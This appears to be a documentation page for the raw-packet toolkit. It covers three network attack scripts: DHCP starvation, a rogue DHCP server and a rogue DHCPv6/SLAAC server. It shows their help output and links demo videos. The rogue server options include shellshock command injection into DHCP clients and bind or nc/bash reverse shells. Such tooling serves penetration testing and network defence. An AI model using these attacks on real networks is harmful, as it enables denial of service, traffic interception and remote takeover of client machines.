---
layout: page
title: DHCP
permalink: /scripts/dhcp/
parent: Scripts
---

# DHCP

The [Dynamic Host Configuration Protocol (DHCP)](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol) is a network management protocol used on UDP/IP networks whereby a DHCP server dynamically assigns an IP address and other network configuration parameters to each device on a network so they can communicate with other IP networks.

## Script: [dhcp_starvation.py](https://github.com/raw-packet/raw-packet/blob/master/Scripts/DHCP/dhcp_starvation.py)

This script implement the attack - DHCP starvation.
DHCP starvation attack is an attack that targets DHCP servers whereby forged DHCP requests are crafted by an attacker with the intent of exhausting all available IP addresses that can be allocated by the DHCP server.

```
root@kali:~/raw-packet# ./Scripts/DHCP/dhcp_starvation.py -h
usage: dhcp_starvation.py [-h] [-i INTERFACE] [-d DELAY] [-t TIMEOUT] [-n]
                          [-v DHCP_OPTION_VALUE] [-c DHCP_OPTION_CODE] [-f]
                          [-m]

DHCP Starvation attack script

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Set interface name for send discover packets
  -d DELAY, --delay DELAY
                        Set delay time in seconds (default: 1)
  -t TIMEOUT, --timeout TIMEOUT
                        Set receiving timeout in seconds (default: 10)
  -n, --not_send_hostname
                        Do not send hostname in DHCP request
  -v DHCP_OPTION_VALUE, --dhcp_option_value DHCP_OPTION_VALUE
                        Set DHCP option value
  -c DHCP_OPTION_CODE, --dhcp_option_code DHCP_OPTION_CODE
                        Set DHCP option code (default: 12)
  -f, --find_dhcp       Only find DHCP server in your network
  -m, --mac_change      Use mac change technique
```

### Demo video:
[![DHCP Starvation demo video](https://raw-packet.github.io/static/images/gifs/dhcp_starvation.gif)](https://youtu.be/Ig5-dRv2NCI)

---

## Script: [dhcp_rogue_server.py](https://github.com/raw-packet/raw-packet/blob/master/Scripts/DHCP/dhcp_rogue_server.py)

This script implements an attack on network clients by using fake DHCP server which answers with malicius configuration faster than legitimate DHCP server. This attack also known as Rogue DHCP Server Attack.

```
root@kali:~/raw-packet# ./dhcp_rogue_server.py -h
usage: dhcp_rogue_server.py [-h] [-i INTERFACE] [-f FIRST_OFFER_IP]
                            [-l LAST_OFFER_IP] [-t TARGET_MAC] [-I TARGET_IP]
                            [-q] [--apple] [--broadcast_response] [--force]
                            [--not_exit] [-c SHELLSHOCK_COMMAND] [-b]
                            [-p BIND_PORT] [-N] [-E] [-R] [-e REVERSE_PORT]
                            [-n] [-B] [-O SHELLSHOCK_OPTION_CODE]
                            [--ip_path IP_PATH] [--iface_name IFACE_NAME]
                            [--dhcp_mac DHCP_MAC] [--dhcp_ip DHCP_IP]
                            [--router ROUTER] [--netmask NETMASK]
                            [--broadcast BROADCAST] [--dns DNS]
                            [--lease_time LEASE_TIME] [--domain DOMAIN]
                            [--proxy PROXY] [--tftp TFTP]

DHCP Rogue server

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Set interface name for send reply packets
  -f FIRST_OFFER_IP, --first_offer_ip FIRST_OFFER_IP
                        Set first client ip for offering
  -l LAST_OFFER_IP, --last_offer_ip LAST_OFFER_IP
                        Set last client ip for offering
  -t TARGET_MAC, --target_mac TARGET_MAC
                        Set target MAC address
  -I TARGET_IP, --target_ip TARGET_IP
                        Set client IP address with MAC in --target_mac
  -q, --quiet           Minimal output
  --apple               Apple devices MiTM
  --broadcast_response  Send broadcast response
  --force               For new client or client after DHCP DECLINE
  --not_exit            Not exit on success MiTM attack
  -c SHELLSHOCK_COMMAND, --shellshock_command SHELLSHOCK_COMMAND
                        Set shellshock command in DHCP client
  -b, --bind_shell      Use awk bind tcp shell in DHCP client
  -p BIND_PORT, --bind_port BIND_PORT
                        Set port for listen bind shell (default=1234)
  -N, --nc_reverse_shell
                        Use nc reverse tcp shell in DHCP client
  -E, --nce_reverse_shell
                        Use nc -e reverse tcp shell in DHCP client
  -R, --bash_reverse_shell
                        Use bash reverse tcp shell in DHCP client
  -e REVERSE_PORT, --reverse_port REVERSE_PORT
                        Set port for listen bind shell (default=443)
  -n, --without_network
                        Do not add network configure in payload
  -B, --without_base64  Do not use base64 encode in payload
  -O SHELLSHOCK_OPTION_CODE, --shellshock_option_code SHELLSHOCK_OPTION_CODE
                        Set dhcp option code for inject shellshock payload,
                        default=114
  --ip_path IP_PATH     Set path to "ip" in shellshock payload, default =
                        /bin/
  --iface_name IFACE_NAME
                        Set iface name in shellshock payload, default = eth0
  --dhcp_mac DHCP_MAC   Set DHCP server MAC address, if not set use your MAC
                        address
  --dhcp_ip DHCP_IP     Set DHCP server IP address, if not set use your IP
                        address
  --router ROUTER       Set router IP address, if not set use your ip address
  --netmask NETMASK     Set network mask, if not set use your netmask
  --broadcast BROADCAST
                        Set network broadcast, if not set use your broadcast
  --dns DNS             Set DNS server IP address, if not set use your ip
                        address
  --lease_time LEASE_TIME
                        Set lease time, default=172800
  --domain DOMAIN       Set domain name for search, default=test.com
  --proxy PROXY         Set proxy server IP address
  --tftp TFTP           Set TFTP server IP address
```

### Demo video:
[![DHCP Rogue server preview](https://j.gifs.com/2R6OEz.gif)](https://youtu.be/OBXol-o2PEU)

---

## Script: [dhcpv6_rogue_server.py](https://github.com/raw-packet/raw-packet/blob/master/Scripts/DHCP/dhcpv6_rogue_server.py)

This script implements fake DHCPv6 server for perfom SLAAC attack/Rogue DHCPv6.

```
root@kali:~/raw-packet# ./dhcpv6_rogue_server.py --help
usage: dhcpv6_rogue_server.py [-h] [-i INTERFACE] [-p PREFIX]
                              [-f FIRST_SUFFIX] [-l LAST_SUFFIX]
                              [-t TARGET_MAC] [-T TARGET_IPV6] [-D] [-d DNS]
                              [-s DNS_SEARCH] [--delay DELAY] [-q]

Rogue SLAAC/DHCPv6 server

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Set interface name for send reply packets
  -p PREFIX, --prefix PREFIX
                        Set network prefix
  -f FIRST_SUFFIX, --first_suffix FIRST_SUFFIX
                        Set first suffix client IPv6 for offering
  -l LAST_SUFFIX, --last_suffix LAST_SUFFIX
                        Set last suffix client IPv6 for offering
  -t TARGET_MAC, --target_mac TARGET_MAC
                        Set target MAC address
  -T TARGET_IPV6, --target_ipv6 TARGET_IPV6
                        Set client Global IPv6 address with MAC in
                        --target_mac
  -D, --disable_dhcpv6  Do not use DHCPv6 protocol
  -d DNS, --dns DNS     Set recursive DNS IPv6 address
  -s DNS_SEARCH, --dns_search DNS_SEARCH
                        Set DNS search list
  --delay DELAY         Set delay between packets
  -q, --quiet           Minimal output
```

---
